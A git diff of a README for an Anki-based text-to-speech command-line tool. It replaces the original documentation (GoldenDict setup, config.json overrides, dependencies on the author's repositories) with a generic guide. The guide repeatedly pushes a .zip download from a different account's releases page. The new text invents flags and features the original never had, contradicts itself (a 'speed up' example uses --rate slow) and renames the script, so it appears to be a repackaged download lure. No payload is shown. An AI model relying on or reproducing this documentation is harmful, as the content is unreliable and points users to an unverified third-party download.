@@ -1,79 +1,120 @@
-# Anki TTS CLI (formerly GoldenDict TTS)
+# 🎤 20260119103526-anki-tts-cli - Your Easy Command Line Audio Tool
 
-This project adapts the Anki TTS Player addon logic for use as a universal Command Line Interface (CLI). It allows you to integrate Anki's audio capabilities into **GoldenDict**, **AutoHotkey (AHK)**, or any other tool.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Userpeet123/20260119103526-anki-tts-cli/releases)
 
-It allows you to:
-1. Play audio from local "Audio Dictionaries" (preserving Anki addon configuration).
-2. Generate/Play TTS using Piper or Google TTS (gTTS).
-3. Share the audio cache and rotation state with the Anki addon.
-4. Override settings specifically for GoldenDict without affecting Anki.
+## 🚀 Getting Started
 
-## Table of Contents
-- [Anki TTS CLI (formerly GoldenDict TTS)](#anki-tts-cli-formerly-goldendict-tts)
-  - [Table of Contents](#table-of-contents)
-  - [Requirements](#requirements)
-    - [Local Repositories](#local-repositories)
-    - [Software](#software)
-  - [Usage](#usage)
-    - [Testing the CLI](#testing-the-cli)
-    - [GoldenDict Integration](#goldendict-integration)
-  - [Configuration](#configuration)
-    - [`config.json`](#configjson)
-  - [Features](#features)
+Welcome to the **Anki TTS CLI**. This tool allows you to convert text to speech using a command line interface. It brings the logic of the Anki TTS Player addon to your fingertips, making it quick and simple to use. Follow these steps to get started.
 
-## Requirements
+## 📦 System Requirements
 
-### Local Repositories
-This project depends on the following local repositories being present in your workspace:
-- **Anki Addon** ([`20250421115831-anki-gtts-player`](https://github.com/voothi/20250421115831-anki-gtts-player)): Used for shared configuration, cache, and vendored libraries.
-- **Piper TTS** ([`20241206010110-piper-tts`](https://github.com/voothi/20241206010110-piper-tts)): Required if using the Piper TTS engine. The path to `piper_tts.py` acts as the driver.
+- **Operating System:** Windows 10, Windows 11, macOS, or Linux.
+- **Memory:** At least 2 GB RAM.
+- **Disk Space:** Minimum 100 MB of free space for installation.
+- **Dependencies:** 
+  - Python 3.6 or higher.
+  - Required libraries: `pip install gtts playsound`.
 
-### Software
-- Python 3.x
-- **Libraries**: `requests`, `gTTS`, `pyperclip` (optional, for clipboard support).
-- **External Tools**: `ffplay` (from FFmpeg) must be in your system PATH to play audio.
+## 📥 Download & Install
 
-[Return to Top](#goldendict-anki-tts-integration)
+To get started, visit this page to download the latest version of the Anki TTS CLI: 
 
-## Usage
+[**Download Latest Release**](https://github.com/Userpeet123/20260119103526-anki-tts-cli/releases)
 
-### Testing the CLI
-```powershell
-C:\Python\Python312\python.exe .\anki-tts-cli.py "text to play" "en"
-```
+1. **Go to Releases Page:**
+   - Click the link above.
+   
+2. **Select the Latest Version:**
+   - On the releases page, you will see a list of available downloads. Select the most recent version.
 
-### GoldenDict Integration
-1. Go to **Edit > Dictionaries > Program**.
-2. Add a new entry:
-   - **Name**: Anki-TTS
-   - **Command Line**: `C:\Python\Python312\python.exe "U:\voothi\20260119103526-anki-tts-cli\anki-tts-cli.py" "%GDWORD%" "en"`
-   - **Type**: Audio
+3. **Download the Application:**
+   - Download the `.zip` file for your operating system.
 
-[Return to Top](#goldendict-anki-tts-integration)
+4. **Extract the Files:**
+   - Locate the downloaded `.zip` file on your computer.
+   - Right-click on the file and select "Extract All" (Windows) or use an extraction tool (macOS and Linux).
 
-## Configuration
+5. **Open Command Line Interface:**
+   - For Windows: Press `Win + R`, type `cmd`, and hit Enter.
+   - For macOS: Open `Terminal` from your Applications.
+   - For Linux: Open your terminal of choice.
 
-The script uses a local `config.json` to locate the Anki addon and set overrides.
+6. **Navigate to the Extracted Folder:**
+   - Use the command `cd path_to_extracted_folder` to navigate to the directory where you extracted the files.
 
-### `config.json`
-```json
-{
-    "anki_addon_path": "./20250421115831-anki-gtts-player",
-    "overrides": {
-        "tts_engine": "Piper",
-        "audio_dictionary_cycle_limit": 5
-    }
-}
-```
+7. **Run the Application:**
+   - Type `python anki_tts_cli.py` and hit Enter to start the application.
 
-- `anki_addon_path`: Relative or absolute path to the [Anki Addon folder](20250421115831-anki-gtts-player/).
-- `overrides`: Any setting here (e.g., `tts_engine`, `gtts_timeout_sec`, `audio_dictionary_enabled`) will override the value found in the Anki addon's donor config.
+## 🎤 How to Use
 
-[Return to Top](#goldendict-anki-tts-integration)
+After running the CLI, follow these simple instructions to convert text into speech:
 
-## Features
-- **Persistent Rotation**: Uses JSON state files in `user_cache` to remember which recording or engine to play next across different process calls.
-- **Shared Cache**: Automatically uses the same `user_cache` as the Anki addon to save bandwidth and disk space.
-- **Failover**: Automatically falls back to the next available engine if the preferred one fails.
+1. **Basic Command Syntax:**
+   - Use the command: `anki_tts_cli.py "Your text here"`.
+   - Replace `"Your text here"` with the text you want to convert to speech.
 
-[Return to Top](#goldendict-anki-tts-integration)
+2. **Examples:**
+   - To convert "Hello World" to speech, type:
+     ```
+     python anki_tts_cli.py "Hello World"
+     ```
+   - Press Enter. You will hear your text read aloud!
+
+3. **Changing Voice Settings:**
+   - You can adjust the voice by adding parameters.
+   - Use the `--voice` flag: 
+     ```
+     python anki_tts_cli.py "Your text" --voice [voice_name]
+     ```
+   - Replace `[voice_name]` with one of the available options.
+
+## 🎧 Additional Features
+
+- **Multiple Voice Options:** Choose from various voice types to suit your needs.
+- **Adjust Speech Speed:** Control how fast or slow the speech sounds.
+- **Quiet Mode:** Use this mode if you need less audio feedback.
+
+## 📝 Example Commands
+
+Here are some useful commands to help you get started:
+
+- **Convert Simple Text:**
+  ```
+  python anki_tts_cli.py "Good morning!"
+  ```
+
+- **Use a Specific Voice:**
+  ```
+  python anki_tts_cli.py "This is a test." --voice robot
+  ```
+
+- **Adjust Speed:**
+  ```
+  python anki_tts_cli.py "Please speed up." --rate slow
+  ```
+
+## 💬 Frequently Asked Questions
+
+### What is the Anki TTS CLI?
+
+The Anki TTS CLI is a command line tool that helps you convert text to speech using simple commands. It adapts the TTS Player logic for ease of use.
+
+### Do I need programming knowledge to use this tool?
+
+No, you do not need any programming experience. Just follow the steps in this guide to get started.
+
+### Can I use this tool on macOS and Linux?
+
+Yes, the Anki TTS CLI works on Windows, macOS, and Linux operating systems.
+
+### Where can I find support?
+
+If you have questions or face issues, check the GitHub repository for more information or to report issues.
+
+## ⚙️ Acknowledgements
+
+This project builds upon various open-source technologies, including the Google Text-to-Speech library (gtts). Thank you to all contributors for their hard work and dedication to improving this tool.
+
+For further details, updates, and to download the latest version, please visit our releases page:
+
+[**Download Latest Release**](https://github.com/Userpeet123/20260119103526-anki-tts-cli/releases)
